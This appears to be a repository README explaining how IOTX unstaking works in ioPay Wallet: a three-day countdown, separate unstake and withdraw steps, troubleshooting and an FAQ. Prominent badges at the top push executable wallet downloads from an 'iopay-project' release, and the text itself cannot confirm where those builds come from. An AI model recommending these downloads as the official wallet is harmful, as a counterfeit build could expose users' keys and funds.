![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# IoTeX Unstaking: The Three-Day Wait, Explained

Unstaking IOTX takes **about three days**. Not instant, and not a single button - the exit is a sequence, and stopping halfway is the most common reason people think their tokens are gone.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

Here is the sequence, the timing, and what to check when the stake does not appear where you expect.

## The sequence

**1. Turn stake-lock off.** Stake-lock is what commits a bucket for its full duration. Turning it off is what makes an exit possible at all, and it starts the countdown. From this moment the bucket stops accruing new rewards.

**2. Wait out the countdown - about three days.** This is the protocol's unstaking period. Nothing you do in the app shortens it.

**3. Unstake.** This ends the staking position. It is a separate action from the one before it, and it is not the last one.

**4. Withdraw.** The staked amount and accrued rewards move to your spendable balance **only here**. Unstaking without withdrawing leaves the tokens in a state that looks like they are still locked.

Two separate actions, about three days after the switch - that is the whole shape of it, and the reason support threads describe "staked but unstakeable" positions that were simply never finished.

## Why the wait exists

Delegated proof of stake needs a period between "this stake is leaving" and "this stake is free" so the chain can settle rewards and so a validator's weight does not change instantly under it. Most delegated-proof-of-stake chains have a version of this; IoTeX's is about three days.

That is also the cost of changing your mind about a validator: exit, wait, restake. [Choosing a validator](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/best-iotex-validator-for-iopay-staking.md) is worth doing deliberately for exactly this reason.

## "I know it's staked but I can't find where to unstake it"

This is the single most common framing of the problem, and it usually is not a lost position. Check these in order:

**Are you on the account that staked?** One phrase can hold several accounts, each with its own `io1...` and `0x...` addresses. A stake made from one account is invisible from another. Switch accounts in the wallet before concluding anything.

**Are you looking at the bucket list or a single position?** Rewards compounding or a second stake can leave you with **more than one bucket**. The bucket you are watching may be empty while another holds the stake.

**Is the position in the countdown?** If stake-lock is already off, the bucket is exiting and the unstake action may not be where you last saw it.

**Is the app showing stale data?** If a chain explorer shows the position and the app does not, the app is behind. [Network errors](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-not-connecting-to-network.md) and [balance not updating](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-balance-not-updating.md) cover the sync side.

## What you get back

**The staked amount plus accrued rewards.** Not the vote count.

Votes are governance weight, not a balance, so a position can display a larger number than the IOTX behind it - that larger number is not what comes back. [The staking guide](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md) explains the mechanics. What matters after an exit is simpler: withdrawal returns your stake plus rewards, however large the vote figure was.

## Do you lose your crypto if you stake?

No - staking does not destroy tokens. It does two things:

- **It locks them** for the duration, or until you complete the exit sequence above.
- **It exposes them to slashing** if the validator you delegated to misbehaves.

Those are the honest risks. A staking position that has been exited and withdrawn is back in your spendable balance; a position still staked is still at risk, which is why "I'll unstake later" is a decision, not a neutral state.

## Timing, precisely

Three days is "about", not exactly. The protocol's unstaking period is measured in blocks and the clock you see in the app is an estimate, so do not plan a transaction for the precise minute the countdown appears to end. If you need funds on a particular day, start the exit several days early.

And do not confuse the two waits: **the countdown is not a withdrawal delay on top of the sequence** - it is the period between turning stake-lock off and being able to unstake. Once you unstake and withdraw, the tokens are yours.

## FAQ

**How long does unstaking IOTX take?**
About three days, from turning stake-lock off to being able to unstake and withdraw.

**How do I unstake IOTX from ioPay?**
Turn stake-lock off, wait out the countdown, unstake, then withdraw. The last two are separate actions.

**Do I lose my crypto if I stake?**
No. It is locked and exposed to slashing, not destroyed.

**Why can't I find my unstake button?**
You are probably on a different account, looking at a different bucket, or already in the countdown. Check the account first, then the bucket list.

**Can I restake after withdrawing?**
Yes, subject to the same minimums as any new stake - [the staking guide](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md) has them.

**Do rewards keep accruing during the countdown?**
No. New accrual stops when the countdown starts; rewards already accrued come out with the position.

## If the countdown seems stuck

The clock is an estimate, so it can sit still while the chain is quiet and then jump. A week of no movement is not that; it usually means the app stopped reading, which shows up as stale balances elsewhere too.

Check the position on an explorer before you act. If the chain shows the countdown finished, the app is behind - reopen it and let it resync. If the chain still shows the position staked, the wait is real and nothing in the app will shorten it. Restarting an exit that has already begun is not possible, which is worth knowing before you try.

---

*Timing follows IoTeX's staking documentation: about three days. Stake-lock, bucket and withdraw mechanics are from the v2.0.2 build and the IoTeX staking guide.*
